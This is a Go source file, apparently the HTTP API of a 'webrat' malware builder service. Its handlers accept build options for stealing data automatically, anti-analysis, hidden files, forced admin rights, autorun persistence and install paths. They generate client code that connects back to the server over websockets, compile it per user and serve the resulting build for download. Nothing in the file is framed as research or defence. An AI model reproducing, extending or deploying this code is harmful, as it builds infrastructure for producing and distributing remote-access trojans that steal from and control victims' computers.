package httpapi

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"strings"

	"webrat-go-api/internal/auth"
	"webrat-go-api/internal/buildergen"
)

type compileRequest struct {
	Code       string `json:"code"`
	Name       string `json:"name"`
	Password   string `json:"password"`
	Icon       string `json:"icon"`
	ForceAdmin string `json:"forceAdmin"`
}

type compileConfigRequest struct {
	Name                string `json:"name"`
	Password            string `json:"password"`
	ForceAdmin          string `json:"forceAdmin"`
	Icon                string `json:"icon"`
	BuildID             string `json:"buildId"`
	Comment             string `json:"comment"`
	AutorunMode         string `json:"autorunMode"`
	StartupDelaySeconds int    `json:"startupDelaySeconds"`
	HideFilesEnabled    bool   `json:"hideFilesEnabled"`
	InstallMode         string `json:"installMode"`
	CustomInstallPath   string `json:"customInstallPath"`
	AntiAnalysis        string `json:"antiAnalysis"`
	AutoSteal           string `json:"autoSteal"`
	OfflineMode         bool   `json:"offlineMode"`
}

func (s *Server) handleCompileGo(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		w.WriteHeader(http.StatusMethodNotAllowed)
		return
	}
	if !s.checkCSRF(w, r) {
		s.writeJSON(w, http.StatusForbidden, map[string]string{"error": "security_check_failed"})
		return
	}

	login := strings.ToLower(strings.TrimSpace(loginFromContext(r)))
	if login == "" {
		w.WriteHeader(http.StatusUnauthorized)
		return
	}

	active, err := s.db.HasActiveCompileJob(login)
	if err == nil && active {
		w.WriteHeader(http.StatusTooManyRequests)
		return
	}

	const maxCompileBody = 2 * 1024 * 1024
	r.Body = http.MaxBytesReader(w, r.Body, maxCompileBody)
	defer r.Body.Close()

	var req compileRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "invalid json", http.StatusBadRequest)
		return
	}

	if strings.TrimSpace(req.Code) == "" {
		http.Error(w, "missing code", http.StatusBadRequest)
		return
	}

	iconBytes := decodeIcon(req.Icon)
	if iconBytes == nil && strings.TrimSpace(req.Icon) != "" {
		http.Error(w, "invalid icon", http.StatusBadRequest)
		return
	}

	jobID, err := auth.NewSessionID()
	if err != nil {
		http.Error(w, "job error", http.StatusInternalServerError)
		return
	}

	if err := s.db.CreateCompileJob(jobID, login, req.Code, req.Name, req.Password, iconBytes, req.ForceAdmin); err != nil {
		http.Error(w, "enqueue error", http.StatusInternalServerError)
		return
	}

	s.writeJSON(w, http.StatusOK, map[string]string{"id": jobID})
}

func (s *Server) handleCompileGoConfig(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		w.WriteHeader(http.StatusMethodNotAllowed)
		return
	}
	if !s.checkCSRF(w, r) {
		s.writeJSON(w, http.StatusForbidden, map[string]string{"error": "security_check_failed"})
		return
	}

	login := strings.ToLower(strings.TrimSpace(loginFromContext(r)))
	if login == "" {
		w.WriteHeader(http.StatusUnauthorized)
		return
	}

	active, err := s.db.HasActiveCompileJob(login)
	if err == nil && active {
		w.WriteHeader(http.StatusTooManyRequests)
		return
	}

	const maxCompileBody = 2 * 1024 * 1024
	r.Body = http.MaxBytesReader(w, r.Body, maxCompileBody)
	defer r.Body.Close()

	var req compileConfigRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "invalid json", http.StatusBadRequest)
		return
	}

	jobID, err := auth.NewSessionID()
	if err != nil {
		http.Error(w, "job error", http.StatusInternalServerError)
		return
	}

	iconBytes := decodeIcon(req.Icon)
	if iconBytes == nil && strings.TrimSpace(req.Icon) != "" {
		http.Error(w, "invalid icon", http.StatusBadRequest)
		return
	}

	builderToken, err := s.db.GetOrCreateBuilderToken(login, auth.NewSessionID)
	if err != nil {
		http.Error(w, "token error", http.StatusInternalServerError)
		return
	}

	scheme := "ws"
	if r.TLS != nil {
		scheme = "wss"
	}

	cfg := buildergen.Config{
		Name:                strings.TrimSpace(req.Name),
		Password:            strings.TrimSpace(req.Password),
		ForceAdmin:          strings.TrimSpace(req.ForceAdmin),
		IconBase64:          strings.TrimSpace(req.Icon),
		BuildID:             strings.TrimSpace(req.BuildID),
		Comment:             strings.TrimSpace(req.Comment),
		AutorunMode:         strings.TrimSpace(req.AutorunMode),
		StartupDelaySeconds: req.StartupDelaySeconds,
		HideFilesEnabled:    req.HideFilesEnabled,
		InstallMode:         strings.TrimSpace(req.InstallMode),
		CustomInstallPath:   strings.TrimSpace(req.CustomInstallPath),
		AntiAnalysis:        strings.TrimSpace(req.AntiAnalysis),
		AutoSteal:           strings.TrimSpace(req.AutoSteal),
		OfflineMode:         req.OfflineMode,
		Owner:               login,
		BuilderToken:        strings.TrimSpace(builderToken),
		ServerHost:          strings.TrimSpace(r.Host),
		WSScheme:            scheme,
	}

	code, err := buildergen.Generate(cfg)
	if err != nil {
		http.Error(w, "codegen error", http.StatusInternalServerError)
		return
	}
	if strings.TrimSpace(code) == "" {
		http.Error(w, "missing code", http.StatusBadRequest)
		return
	}

	if err := s.db.CreateCompileJob(jobID, login, code, req.Name, req.Password, iconBytes, req.ForceAdmin); err != nil {
		http.Error(w, "enqueue error", http.StatusInternalServerError)
		return
	}

	s.writeJSON(w, http.StatusOK, map[string]string{"id": jobID})
}

func (s *Server) handleCompileStatus(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		w.WriteHeader(http.StatusMethodNotAllowed)
		return
	}

	login := strings.ToLower(strings.TrimSpace(loginFromContext(r)))
	if login == "" {
		w.WriteHeader(http.StatusUnauthorized)
		return
	}

	jobID := strings.TrimSpace(r.URL.Query().Get("id"))
	if jobID == "" {
		http.Error(w, "missing id", http.StatusBadRequest)
		return
	}

	j, exists, err := s.db.GetCompileJob(jobID, login)
	if err != nil {
		http.Error(w, "status error", http.StatusInternalServerError)
		return
	}
	if !exists {
		w.WriteHeader(http.StatusNotFound)
		return
	}

	s.writeJSON(w, http.StatusOK, map[string]any{
		"id":     j.ID,
		"status": j.Status,
		"error":  j.Error,
	})
}

func (s *Server) handleCompileDownload(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		w.WriteHeader(http.StatusMethodNotAllowed)
		return
	}

	w.Header().Set("Cache-Control", "no-store")
	w.Header().Set("Pragma", "no-cache")
	w.Header().Set("Expires", "0")
	w.Header().Set("X-Content-Type-Options", "nosniff")

	login := strings.ToLower(strings.TrimSpace(loginFromContext(r)))
	if login == "" {
		w.WriteHeader(http.StatusUnauthorized)
		return
	}

	jobID := strings.TrimSpace(r.URL.Query().Get("id"))
	if jobID == "" {
		http.Error(w, "missing id", http.StatusBadRequest)
		return
	}

	data, filename, okArtifact, err := s.db.GetCompileArtifact(jobID, login)
	if err != nil {
		http.Error(w, "download error", http.StatusInternalServerError)
		return
	}
	if !okArtifact {
		w.WriteHeader(http.StatusNotFound)
		return
	}
	if filename == "" {
		filename = "build.zip"
	}

	w.Header().Set("Content-Type", "application/zip")
	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=%q", filename))
	_, _ = w.Write(data)
}

func decodeIcon(iconB64 string) []byte {
	s := strings.TrimSpace(iconB64)
	if s == "" {
		return nil
	}
	b, err := base64.StdEncoding.DecodeString(s)
	if err != nil {
		return nil
	}
	const maxIconBytes = 512 * 1024
	if len(b) > maxIconBytes {
		return nil
	}
	return b
}